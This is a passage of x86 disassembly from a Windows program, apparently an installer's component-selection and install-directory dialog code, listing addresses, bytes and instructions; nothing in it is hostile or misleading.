  404113:	ff 15 78 81 40 00    	call   *0x408178
  404119:	85 c0                	test   %eax,%eax
  40411b:	74 56                	je     0x404173
  40411d:	50                   	push   %eax
  40411e:	ff 15 ac 82 40 00    	call   *0x4082ac
  404124:	56                   	push   %esi
  404125:	e8 90 1e 00 00       	call   0x405fba
  40412a:	a1 9c 05 47 00       	mov    0x47059c,%eax
  40412f:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  404135:	85 c0                	test   %eax,%eax
  404137:	74 28                	je     0x404161
  404139:	81 fe a8 50 4c 00    	cmp    $0x4c50a8,%esi
  40413f:	75 20                	jne    0x404161
  404141:	50                   	push   %eax
  404142:	6a 00                	push   $0x0
  404144:	e8 55 1f 00 00       	call   0x40609e
  404149:	57                   	push   %edi
  40414a:	bf 00 05 46 00       	mov    $0x460500,%edi
  40414f:	57                   	push   %edi
  404150:	ff 15 14 81 40 00    	call   *0x408114
  404156:	85 c0                	test   %eax,%eax
  404158:	74 07                	je     0x404161
  40415a:	57                   	push   %edi
  40415b:	56                   	push   %esi
  40415c:	e8 47 19 00 00       	call   0x405aa8
  404161:	ff 05 e4 61 43 00    	incl   0x4361e4
  404167:	56                   	push   %esi
  404168:	53                   	push   %ebx
  404169:	ff 75 08             	push   0x8(%ebp)
  40416c:	e8 8e 15 00 00       	call   0x4056ff
  404171:	eb 07                	jmp    0x40417a
  404173:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  40417a:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404181:	74 0d                	je     0x404190
  404183:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  40418a:	0f 85 7e 01 00 00    	jne    0x40430e
  404190:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404194:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404198:	56                   	push   %esi
  404199:	53                   	push   %ebx
  40419a:	e8 66 15 00 00       	call   0x405705
  40419f:	56                   	push   %esi
  4041a0:	e8 71 1e 00 00       	call   0x406016
  4041a5:	85 c0                	test   %eax,%eax
  4041a7:	75 07                	jne    0x4041b0
  4041a9:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4041b0:	56                   	push   %esi
  4041b1:	bf 08 a2 43 00       	mov    $0x43a208,%edi
  4041b6:	57                   	push   %edi
  4041b7:	e8 d0 18 00 00       	call   0x405a8c
  4041bc:	33 db                	xor    %ebx,%ebx
  4041be:	53                   	push   %ebx
  4041bf:	e8 cf 19 00 00       	call   0x405b93
  4041c4:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4041c7:	3b c3                	cmp    %ebx,%eax
  4041c9:	74 3c                	je     0x404207
  4041cb:	33 c0                	xor    %eax,%eax
  4041cd:	3b c7                	cmp    %edi,%eax
  4041cf:	74 34                	je     0x404205
  4041d1:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4041d4:	50                   	push   %eax
  4041d5:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4041d8:	50                   	push   %eax
  4041d9:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4041dc:	50                   	push   %eax
  4041dd:	57                   	push   %edi
  4041de:	ff 55 f4             	call   *-0xc(%ebp)
  4041e1:	85 c0                	test   %eax,%eax
  4041e3:	75 75                	jne    0x40425a
  4041e5:	85 db                	test   %ebx,%ebx
  4041e7:	74 03                	je     0x4041ec
  4041e9:	66 89 03             	mov    %ax,(%ebx)
  4041ec:	57                   	push   %edi
  4041ed:	e8 f7 1d 00 00       	call   0x405fe9
  4041f2:	8b d8                	mov    %eax,%ebx
  4041f4:	33 c0                	xor    %eax,%eax
  4041f6:	66 89 03             	mov    %ax,(%ebx)
  4041f9:	4b                   	dec    %ebx
  4041fa:	4b                   	dec    %ebx
  4041fb:	6a 5c                	push   $0x5c
  4041fd:	58                   	pop    %eax
  4041fe:	66 89 03             	mov    %ax,(%ebx)
  404201:	3b df                	cmp    %edi,%ebx
  404203:	75 cc                	jne    0x4041d1
  404205:	33 db                	xor    %ebx,%ebx
  404207:	56                   	push   %esi
  404208:	57                   	push   %edi
  404209:	e8 7e 18 00 00       	call   0x405a8c
  40420e:	57                   	push   %edi
  40420f:	e8 c7 15 00 00       	call   0x4057db
  404214:	3b c3                	cmp    %ebx,%eax
  404216:	74 05                	je     0x40421d
  404218:	33 c9                	xor    %ecx,%ecx
  40421a:	66 89 08             	mov    %cx,(%eax)
  40421d:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404220:	50                   	push   %eax
  404221:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404224:	50                   	push   %eax
  404225:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404228:	50                   	push   %eax
  404229:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40422c:	50                   	push   %eax
  40422d:	57                   	push   %edi
  40422e:	ff 15 c4 80 40 00    	call   *0x4080c4
  404234:	85 c0                	test   %eax,%eax
  404236:	74 3a                	je     0x404272
  404238:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40423b:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  40423f:	be 00 04 00 00       	mov    $0x400,%esi
  404244:	56                   	push   %esi
  404245:	ff 75 f4             	push   -0xc(%ebp)
  404248:	50                   	push   %eax
  404249:	ff 15 48 81 40 00    	call   *0x408148
  40424f:	8b f8                	mov    %eax,%edi
  404251:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404258:	eb 20                	jmp    0x40427a
  40425a:	8b 7d d8             	mov    -0x28(%ebp),%edi
  40425d:	8b 45 dc             	mov    -0x24(%ebp),%eax
  404260:	0f ac c7 0a          	shrd   $0xa,%eax,%edi
  404264:	c1 e8 0a             	shr    $0xa,%eax
  404267:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  40426e:	33 db                	xor    %ebx,%ebx
  404270:	eb 03                	jmp    0x404275
  404272:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404275:	be 00 04 00 00       	mov    $0x400,%esi
  40427a:	6a 05                	push   $0x5
  40427c:	e8 2f fd ff ff       	call   0x403fb0
  404281:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  404284:	74 0b                	je     0x404291
  404286:	3b f8                	cmp    %eax,%edi
  404288:	73 07                	jae    0x404291
  40428a:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  404291:	8b 0d 68 85 46 00    	mov    0x468568,%ecx
  404297:	39 59 10             	cmp    %ebx,0x10(%ecx)
  40429a:	74 2b                	je     0x4042c7
  40429c:	6a fb                	push   $0xfffffffb
  40429e:	68 ff 03 00 00       	push   $0x3ff
  4042a3:	e8 3f fc ff ff       	call   0x403ee7
  4042a8:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4042ab:	74 0c                	je     0x4042b9
  4042ad:	6a fc                	push   $0xfffffffc
  4042af:	56                   	push   %esi
  4042b0:	8b c7                	mov    %edi,%eax
  4042b2:	e8 30 fc ff ff       	call   0x403ee7
  4042b7:	eb 0e                	jmp    0x4042c7
  4042b9:	68 6c 85 40 00       	push   $0x40856c
  4042be:	56                   	push   %esi
  4042bf:	ff 75 08             	push   0x8(%ebp)
  4042c2:	e8 38 14 00 00       	call   0x4056ff
  4042c7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4042ca:	a3 64 06 47 00       	mov    %eax,0x470664
  4042cf:	3b c3                	cmp    %ebx,%eax
  4042d1:	75 0a                	jne    0x4042dd
  4042d3:	6a 07                	push   $0x7
  4042d5:	e8 43 d1 ff ff       	call   0x40141d
  4042da:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4042dd:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4042e0:	85 70 14             	test   %esi,0x14(%eax)
  4042e3:	74 03                	je     0x4042e8
  4042e5:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4042e8:	33 c0                	xor    %eax,%eax
  4042ea:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  4042ed:	0f 94 c0             	sete   %al
  4042f0:	50                   	push   %eax
  4042f1:	e8 eb f5 ff ff       	call   0x4038e1
  4042f6:	39 5d fc             	cmp    %ebx,-0x4(%ebp)
  4042f9:	75 0d                	jne    0x404308
  4042fb:	39 1d e4 61 43 00    	cmp    %ebx,0x4361e4
  404301:	75 05                	jne    0x404308
  404303:	e8 b5 f5 ff ff       	call   0x4038bd
  404308:	89 1d e4 61 43 00    	mov    %ebx,0x4361e4
  40430e:	ff 75 14             	push   0x14(%ebp)
  404311:	8b 45 0c             	mov    0xc(%ebp),%eax
  404314:	ff 75 10             	push   0x10(%ebp)
  404317:	e8 0a f6 ff ff       	call   0x403926
  40431c:	5f                   	pop    %edi
  40431d:	5e                   	pop    %esi
  40431e:	5b                   	pop    %ebx
  40431f:	c9                   	leave
  404320:	c2 10 00             	ret    $0x10
  404323:	55                   	push   %ebp
  404324:	8b ec                	mov    %esp,%ebp
  404326:	83 ec 38             	sub    $0x38,%esp
  404329:	56                   	push   %esi
  40432a:	8b 35 78 82 40 00    	mov    0x408278,%esi
  404330:	57                   	push   %edi
  404331:	8b 7d 08             	mov    0x8(%ebp),%edi
  404334:	6a 00                	push   $0x0
  404336:	6a 09                	push   $0x9
  404338:	68 0a 11 00 00       	push   $0x110a
  40433d:	57                   	push   %edi
  40433e:	ff d6                	call   *%esi
  404340:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  404344:	74 3a                	je     0x404380
  404346:	ff 15 98 81 40 00    	call   *0x408198
  40434c:	0f bf c8             	movswl %ax,%ecx
  40434f:	c1 e8 10             	shr    $0x10,%eax
  404352:	98                   	cwtl
  404353:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404356:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404359:	50                   	push   %eax
  40435a:	57                   	push   %edi
  40435b:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40435e:	ff 15 94 81 40 00    	call   *0x408194
  404364:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404367:	50                   	push   %eax
  404368:	6a 00                	push   $0x0
  40436a:	68 11 11 00 00       	push   $0x1111
  40436f:	57                   	push   %edi
  404370:	ff d6                	call   *%esi
  404372:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  404376:	75 05                	jne    0x40437d
  404378:	83 c8 ff             	or     $0xffffffff,%eax
  40437b:	eb 1e                	jmp    0x40439b
  40437d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404380:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404383:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404386:	50                   	push   %eax
  404387:	6a 00                	push   $0x0
  404389:	68 3e 11 00 00       	push   $0x113e
  40438e:	57                   	push   %edi
  40438f:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  404396:	ff d6                	call   *%esi
  404398:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40439b:	5f                   	pop    %edi
  40439c:	5e                   	pop    %esi
  40439d:	c9                   	leave
  40439e:	c2 08 00             	ret    $0x8
  4043a1:	55                   	push   %ebp
  4043a2:	8b ec                	mov    %esp,%ebp
  4043a4:	81 7d 0c 02 01 00 00 	cmpl   $0x102,0xc(%ebp)
  4043ab:	53                   	push   %ebx
  4043ac:	56                   	push   %esi
  4043ad:	75 17                	jne    0x4043c6
  4043af:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  4043b3:	75 7d                	jne    0x404432
  4043b5:	68 13 04 00 00       	push   $0x413
  4043ba:	e8 4c f5 ff ff       	call   0x40390b
  4043bf:	33 c0                	xor    %eax,%eax
  4043c1:	e9 85 00 00 00       	jmp    0x40444b
  4043c6:	81 7d 0c 00 02 00 00 	cmpl   $0x200,0xc(%ebp)
  4043cd:	be 19 04 00 00       	mov    $0x419,%esi
  4043d2:	75 1e                	jne    0x4043f2
  4043d4:	ff 75 08             	push   0x8(%ebp)
  4043d7:	ff 15 a0 81 40 00    	call   *0x4081a0
  4043dd:	85 c0                	test   %eax,%eax
  4043df:	74 51                	je     0x404432
  4043e1:	6a 01                	push   $0x1
  4043e3:	ff 75 08             	push   0x8(%ebp)
  4043e6:	e8 38 ff ff ff       	call   0x404323
  4043eb:	8b d8                	mov    %eax,%ebx
  4043ed:	89 75 0c             	mov    %esi,0xc(%ebp)
  4043f0:	eb 03                	jmp    0x4043f5
  4043f2:	8b 5d 14             	mov    0x14(%ebp),%ebx
  4043f5:	39 75 0c             	cmp    %esi,0xc(%ebp)
  4043f8:	75 3b                	jne    0x404435
  4043fa:	39 1d 50 62 45 00    	cmp    %ebx,0x456250
  404400:	74 33                	je     0x404435
  404402:	57                   	push   %edi
  404403:	be 00 10 47 00       	mov    $0x471000,%esi
  404408:	56                   	push   %esi
  404409:	bf 20 62 44 00       	mov    $0x446220,%edi
  40440e:	57                   	push   %edi
  40440f:	89 1d 50 62 45 00    	mov    %ebx,0x456250
  404415:	e8 72 16 00 00       	call   0x405a8c
  40441a:	53                   	push   %ebx
  40441b:	56                   	push   %esi
  40441c:	e8 b2 15 00 00       	call   0x4059d3
  404421:	6a 06                	push   $0x6
  404423:	e8 f5 cf ff ff       	call   0x40141d
  404428:	57                   	push   %edi
  404429:	56                   	push   %esi
  40442a:	e8 5d 16 00 00       	call   0x405a8c
  40442f:	5f                   	pop    %edi
  404430:	eb 03                	jmp    0x404435
  404432:	8b 5d 14             	mov    0x14(%ebp),%ebx
  404435:	53                   	push   %ebx
  404436:	ff 75 10             	push   0x10(%ebp)
  404439:	ff 75 0c             	push   0xc(%ebp)
  40443c:	ff 75 08             	push   0x8(%ebp)
  40443f:	ff 35 e0 61 43 00    	push   0x4361e0
  404445:	ff 15 9c 81 40 00    	call   *0x40819c
  40444b:	5e                   	pop    %esi
  40444c:	5b                   	pop    %ebx
  40444d:	5d                   	pop    %ebp
  40444e:	c2 10 00             	ret    $0x10
  404451:	55                   	push   %ebp
  404452:	8b ec                	mov    %esp,%ebp
  404454:	83 ec 54             	sub    $0x54,%esp
  404457:	53                   	push   %ebx
  404458:	56                   	push   %esi
  404459:	8b 35 60 82 40 00    	mov    0x408260,%esi
  40445f:	57                   	push   %edi
  404460:	68 f9 03 00 00       	push   $0x3f9
  404465:	ff 75 08             	push   0x8(%ebp)
  404468:	ff d6                	call   *%esi
  40446a:	68 08 04 00 00       	push   $0x408
  40446f:	ff 75 08             	push   0x8(%ebp)
  404472:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404475:	ff d6                	call   *%esi
  404477:	8b 35 78 82 40 00    	mov    0x408278,%esi
  40447d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404480:	a1 a8 05 47 00       	mov    0x4705a8,%eax
  404485:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404488:	a1 9c 05 47 00       	mov    0x47059c,%eax
  40448d:	05 94 00 00 00       	add    $0x94,%eax
  404492:	33 db                	xor    %ebx,%ebx
  404494:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  40449b:	6a 10                	push   $0x10
  40449d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4044a0:	5f                   	pop    %edi
  4044a1:	0f 85 1a 02 00 00    	jne    0x4046c1
  4044a7:	8b 45 08             	mov    0x8(%ebp),%eax
  4044aa:	a3 f0 05 47 00       	mov    %eax,0x4705f0
  4044af:	a1 ac 05 47 00       	mov    0x4705ac,%eax
  4044b4:	c1 e0 02             	shl    $0x2,%eax
  4044b7:	50                   	push   %eax
  4044b8:	6a 40                	push   $0x40
  4044ba:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  4044bd:	c7 45 ec 02 00 00 00 	movl   $0x2,-0x14(%ebp)
  4044c4:	ff 15 20 81 40 00    	call   *0x408120
  4044ca:	6a 6e                	push   $0x6e
  4044cc:	ff 35 98 05 47 00    	push   0x470598
  4044d2:	a3 fc a1 43 00       	mov    %eax,0x43a1fc
  4044d7:	ff 15 a4 81 40 00    	call   *0x4081a4
  4044dd:	83 0d 50 62 45 00 ff 	orl    $0xffffffff,0x456250
  4044e4:	68 a1 43 40 00       	push   $0x4043a1
  4044e9:	6a fc                	push   $0xfffffffc
  4044eb:	ff 75 fc             	push   -0x4(%ebp)
  4044ee:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4044f1:	ff 15 64 82 40 00    	call   *0x408264
  4044f7:	53                   	push   %ebx
  4044f8:	6a 06                	push   $0x6
  4044fa:	6a 21                	push   $0x21
  4044fc:	57                   	push   %edi
  4044fd:	57                   	push   %edi
  4044fe:	a3 e0 61 43 00       	mov    %eax,0x4361e0
  404503:	ff 15 34 80 40 00    	call   *0x408034
  404509:	68 ff 00 ff 00       	push   $0xff00ff
  40450e:	ff 75 f0             	push   -0x10(%ebp)
  404511:	a3 f8 a1 43 00       	mov    %eax,0x43a1f8
  404516:	50                   	push   %eax
  404517:	ff 15 28 80 40 00    	call   *0x408028
  40451d:	ff 35 f8 a1 43 00    	push   0x43a1f8
  404523:	6a 02                	push   $0x2
  404525:	68 09 11 00 00       	push   $0x1109
  40452a:	ff 75 fc             	push   -0x4(%ebp)
  40452d:	ff d6                	call   *%esi
  40452f:	53                   	push   %ebx
  404530:	53                   	push   %ebx
  404531:	68 1c 11 00 00       	push   $0x111c
  404536:	ff 75 fc             	push   -0x4(%ebp)
  404539:	ff d6                	call   *%esi
  40453b:	3b c7                	cmp    %edi,%eax
  40453d:	7d 0c                	jge    0x40454b
  40453f:	53                   	push   %ebx
  404540:	57                   	push   %edi
  404541:	68 1b 11 00 00       	push   $0x111b
  404546:	ff 75 fc             	push   -0x4(%ebp)
  404549:	ff d6                	call   *%esi
  40454b:	ff 75 f0             	push   -0x10(%ebp)
  40454e:	ff 15 44 80 40 00    	call   *0x408044
  404554:	33 ff                	xor    %edi,%edi
  404556:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404559:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  40455c:	3b c3                	cmp    %ebx,%eax
  40455e:	74 27                	je     0x404587
  404560:	83 ff 20             	cmp    $0x20,%edi
  404563:	74 03                	je     0x404568
  404565:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  404568:	50                   	push   %eax
  404569:	53                   	push   %ebx
  40456a:	e8 2f 1b 00 00       	call   0x40609e
  40456f:	50                   	push   %eax
  404570:	53                   	push   %ebx
  404571:	68 43 01 00 00       	push   $0x143
  404576:	ff 75 f8             	push   -0x8(%ebp)
  404579:	ff d6                	call   *%esi
  40457b:	57                   	push   %edi
  40457c:	50                   	push   %eax
  40457d:	68 51 01 00 00       	push   $0x151
  404582:	ff 75 f8             	push   -0x8(%ebp)
  404585:	ff d6                	call   *%esi
  404587:	47                   	inc    %edi
  404588:	83 ff 21             	cmp    $0x21,%edi
  40458b:	7c c9                	jl     0x404556
  40458d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404590:	8b 7d 14             	mov    0x14(%ebp),%edi
  404593:	ff 74 87 30          	push   0x30(%edi,%eax,4)
  404597:	6a 15                	push   $0x15
  404599:	ff 75 08             	push   0x8(%ebp)
  40459c:	e8 fa f2 ff ff       	call   0x40389b
  4045a1:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4045a4:	ff 74 87 34          	push   0x34(%edi,%eax,4)
  4045a8:	6a 16                	push   $0x16
  4045aa:	ff 75 08             	push   0x8(%ebp)
  4045ad:	e8 e9 f2 ff ff       	call   0x40389b
  4045b2:	33 ff                	xor    %edi,%edi
  4045b4:	39 1d ac 05 47 00    	cmp    %ebx,0x4705ac
  4045ba:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  4045bd:	0f 8e bc 00 00 00    	jle    0x40467f
  4045c3:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4045c6:	83 c0 08             	add    $0x8,%eax
  4045c9:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4045cc:	bb 32 11 00 00       	mov    $0x1132,%ebx
  4045d1:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4045d4:	8d 42 10             	lea    0x10(%edx),%eax
  4045d7:	66 83 38 00          	cmpw   $0x0,(%eax)
  4045db:	0f 84 84 00 00 00    	je     0x404665
  4045e1:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4045e4:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4045e7:	8b 02                	mov    (%edx),%eax
  4045e9:	6a 20                	push   $0x20
  4045eb:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  4045ee:	59                   	pop    %ecx
  4045ef:	8b d0                	mov    %eax,%edx
  4045f1:	23 d1                	and    %ecx,%edx
  4045f3:	c7 45 b0 02 00 ff ff 	movl   $0xffff0002,-0x50(%ebp)
  4045fa:	c7 45 b4 0d 00 00 00 	movl   $0xd,-0x4c(%ebp)
  404601:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  404604:	89 7d d8             	mov    %edi,-0x28(%ebp)
  404607:	89 55 bc             	mov    %edx,-0x44(%ebp)
  40460a:	a8 02                	test   $0x2,%al
  40460c:	74 26                	je     0x404634
  40460e:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404611:	50                   	push   %eax
  404612:	6a 00                	push   $0x0
  404614:	53                   	push   %ebx
  404615:	ff 75 fc             	push   -0x4(%ebp)
  404618:	c7 45 b4 4d 00 00 00 	movl   $0x4d,-0x4c(%ebp)
  40461f:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  404626:	ff d6                	call   *%esi
  404628:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40462b:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  404632:	eb 28                	jmp    0x40465c
  404634:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404637:	f6 00 04             	testb  $0x4,(%eax)
  40463a:	74 14                	je     0x404650
  40463c:	ff 75 f4             	push   -0xc(%ebp)
  40463f:	6a 03                	push   $0x3
  404641:	68 0a 11 00 00       	push   $0x110a
  404646:	ff 75 fc             	push   -0x4(%ebp)
  404649:	ff d6                	call   *%esi
  40464b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40464e:	eb 15                	jmp    0x404665
  404650:	8d 45 ac             	lea    -0x54(%ebp),%eax
  404653:	50                   	push   %eax
  404654:	6a 00                	push   $0x0
  404656:	53                   	push   %ebx
  404657:	ff 75 fc             	push   -0x4(%ebp)
  40465a:	ff d6                	call   *%esi
  40465c:	8b 0d fc a1 43 00    	mov    0x43a1fc,%ecx
  404662:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  404665:	81 45 f0 20 40 00 00 	addl   $0x4020,-0x10(%ebp)
  40466c:	47                   	inc    %edi
  40466d:	3b 3d ac 05 47 00    	cmp    0x4705ac,%edi
  404673:	0f 8c 58 ff ff ff    	jl     0x4045d1
  404679:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  40467d:	75 1a                	jne    0x404699
  40467f:	6a f0                	push   $0xfffffff0
  404681:	ff 75 fc             	push   -0x4(%ebp)
  404684:	ff 15 48 82 40 00    	call   *0x408248
  40468a:	83 e0 fb             	and    $0xfffffffb,%eax
  40468d:	50                   	push   %eax
  40468e:	6a f0                	push   $0xfffffff0
  404690:	ff 75 fc             	push   -0x4(%ebp)
  404693:	ff 15 64 82 40 00    	call   *0x408264
  404699:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  40469d:	75 18                	jne    0x4046b7
  40469f:	6a 05                	push   $0x5
  4046a1:	ff 75 f8             	push   -0x8(%ebp)
  4046a4:	ff 15 34 82 40 00    	call   *0x408234
  4046aa:	ff 75 f8             	push   -0x8(%ebp)
  4046ad:	e8 42 f2 ff ff       	call   0x4038f4
  4046b2:	e9 7b 03 00 00       	jmp    0x404a32
  4046b7:	ff 75 fc             	push   -0x4(%ebp)
  4046ba:	e8 35 f2 ff ff       	call   0x4038f4
  4046bf:	33 db                	xor    %ebx,%ebx
  4046c1:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  4046c8:	75 11                	jne    0x4046db
  4046ca:	89 5d 10             	mov    %ebx,0x10(%ebp)
  4046cd:	c7 45 14 01 00 00 00 	movl   $0x1,0x14(%ebp)
  4046d4:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4046db:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  4046df:	b8 13 04 00 00       	mov    $0x413,%eax
  4046e4:	74 09                	je     0x4046ef
  4046e6:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4046e9:	0f 85 dc 00 00 00    	jne    0x4047cb
  4046ef:	8b 7d 14             	mov    0x14(%ebp),%edi
  4046f2:	39 45 0c             	cmp    %eax,0xc(%ebp)
  4046f5:	74 0d                	je     0x404704
  4046f7:	81 7f 04 08 04 00 00 	cmpl   $0x408,0x4(%edi)
  4046fe:	0f 85 c7 00 00 00    	jne    0x4047cb
  404704:	f7 05 e8 05 47 00 00 	testl  $0x200,0x4705e8
  40470b:	02 00 00 
  40470e:	75 79                	jne    0x404789
  404710:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404713:	74 09                	je     0x40471e
  404715:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404718:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  40471c:	75 6b                	jne    0x404789
  40471e:	33 c9                	xor    %ecx,%ecx
  404720:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404723:	0f 95 c1             	setne  %cl
  404726:	51                   	push   %ecx
  404727:	ff 75 fc             	push   -0x4(%ebp)
  40472a:	e8 f4 fb ff ff       	call   0x404323
  40472f:	3b c3                	cmp    %ebx,%eax
  404731:	7c 56                	jl     0x404789
  404733:	8b 55 e8             	mov    -0x18(%ebp),%edx
  404736:	8b c8                	mov    %eax,%ecx
  404738:	69 c9 20 40 00 00    	imul   $0x4020,%ecx,%ecx
  40473e:	8d 54 11 08          	lea    0x8(%ecx,%edx,1),%edx
  404742:	8b 0a                	mov    (%edx),%ecx
  404744:	f6 c1 10             	test   $0x10,%cl
  404747:	75 40                	jne    0x404789
  404749:	f6 c1 40             	test   $0x40,%cl
  40474c:	74 14                	je     0x404762
  40474e:	81 f1 80 00 00 00    	xor    $0x80,%ecx
  404754:	84 c9                	test   %cl,%cl
  404756:	79 05                	jns    0x40475d
  404758:	83 c9 01             	or     $0x1,%ecx
  40475b:	eb 08                	jmp    0x404765
  40475d:	83 e1 fe             	and    $0xfffffffe,%ecx
  404760:	eb 03                	jmp    0x404765
  404762:	83 f1 01             	xor    $0x1,%ecx
  404765:	50                   	push   %eax
  404766:	89 0a                	mov    %ecx,(%edx)
  404768:	e8 19 ca ff ff       	call   0x401186
  40476d:	a1 e8 05 47 00       	mov    0x4705e8,%eax
  404772:	33 c9                	xor    %ecx,%ecx
  404774:	c1 e8 08             	shr    $0x8,%eax
  404777:	41                   	inc    %ecx
  404778:	f7 d0                	not    %eax
  40477a:	23 c1                	and    %ecx,%eax
  40477c:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40477f:	89 45 14             	mov    %eax,0x14(%ebp)
  404782:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404789:	3b fb                	cmp    %ebx,%edi
  40478b:	74 3e                	je     0x4047cb
  40478d:	81 7f 08 3d fe ff ff 	cmpl   $0xfffffe3d,0x8(%edi)
  404794:	75 0e                	jne    0x4047a4
  404796:	ff 77 5c             	push   0x5c(%edi)
  404799:	53                   	push   %ebx
  40479a:	68 19 04 00 00       	push   $0x419
  40479f:	ff 75 fc             	push   -0x4(%ebp)
  4047a2:	ff d6                	call   *%esi
  4047a4:	81 7f 08 39 fe ff ff 	cmpl   $0xfffffe39,0x8(%edi)
  4047ab:	75 1e                	jne    0x4047cb
  4047ad:	8b 47 5c             	mov    0x5c(%edi),%eax
  4047b0:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  4047b3:	69 c0 20 40 00 00    	imul   $0x4020,%eax,%eax
  4047b9:	83 7f 0c 02          	cmpl   $0x2,0xc(%edi)
  4047bd:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  4047c1:	75 05                	jne    0x4047c8
  4047c3:	83 08 20             	orl    $0x20,(%eax)
  4047c6:	eb 03                	jmp    0x4047cb
  4047c8:	83 20 df             	andl   $0xffffffdf,(%eax)
  4047cb:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  4047d2:	75 75                	jne    0x404849
  4047d4:	b8 f9 03 00 00       	mov    $0x3f9,%eax
  4047d9:	66 39 45 10          	cmp    %ax,0x10(%ebp)
  4047dd:	0f 85 4f 02 00 00    	jne    0x404a32
  4047e3:	8b 45 10             	mov    0x10(%ebp),%eax
  4047e6:	c1 e8 10             	shr    $0x10,%eax
  4047e9:	66 83 f8 01          	cmp    $0x1,%ax
  4047ed:	0f 85 3f 02 00 00    	jne    0x404a32
  4047f3:	53                   	push   %ebx
  4047f4:	53                   	push   %ebx
  4047f5:	68 47 01 00 00       	push   $0x147
  4047fa:	ff 75 f8             	push   -0x8(%ebp)
  4047fd:	ff d6                	call   *%esi
  4047ff:	83 f8 ff             	cmp    $0xffffffff,%eax
  404802:	0f 84 2a 02 00 00    	je     0x404a32
  404808:	53                   	push   %ebx
  404809:	50                   	push   %eax
  40480a:	68 50 01 00 00       	push   $0x150
  40480f:	ff 75 f8             	push   -0x8(%ebp)
  404812:	ff d6                	call   *%esi
  404814:	8b f8                	mov    %eax,%edi
  404816:	83 ff ff             	cmp    $0xffffffff,%edi
  404819:	74 08                	je     0x404823
  40481b:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40481e:	39 1c b8             	cmp    %ebx,(%eax,%edi,4)
  404821:	75 03                	jne    0x404826
